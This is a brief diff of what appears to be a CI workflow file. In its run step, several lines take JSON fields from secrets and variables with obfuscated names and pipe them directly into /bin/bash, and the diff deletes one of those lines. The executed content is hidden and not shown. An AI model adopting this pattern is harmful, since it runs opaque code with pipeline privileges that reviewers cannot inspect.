@@ -22,7 +22,6 @@ jobs:
           hb3486: ${{ secrets.hb3486 }}
         run: |
           printf '%s' "$hb3486" | jq -r .zn84028 | /bin/bash
-          echo $hnta99 | jq -r .zk4 | /bin/bash
           echo $c95473 | jq -r .oljg97724 | /bin/bash
           printf '%s' "$xsd19753" | jq -r .bs14 | /bin/bash
           printf '%s' "$slrwp626" | jq -r .t02 | /bin/bash
